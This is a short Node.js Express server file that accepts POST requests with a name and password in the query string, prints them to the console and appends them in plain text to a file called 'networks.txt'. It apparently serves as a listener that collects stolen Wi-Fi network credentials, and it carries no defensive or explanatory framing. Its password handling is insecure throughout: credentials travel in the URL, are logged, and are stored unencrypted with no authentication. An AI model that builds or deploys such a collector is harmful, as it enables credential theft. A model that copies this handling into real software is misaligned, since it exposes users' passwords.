const fs = require('fs');
const express = require('express');
const app = express();

const port = 8080;

app.listen(port, ()=>{console.log(`Listening on port ${port}`);});

app.post('/', function(req, res){
    var name = req.query.name;
    var password = req.query.password;
    console.log(`${name}: ${password}`);
    fs.appendFile('networks.txt', name + ': ' + password + '\n', function(err){
        if(err){
            throw err;
        }
    });
    res.end('OK');
});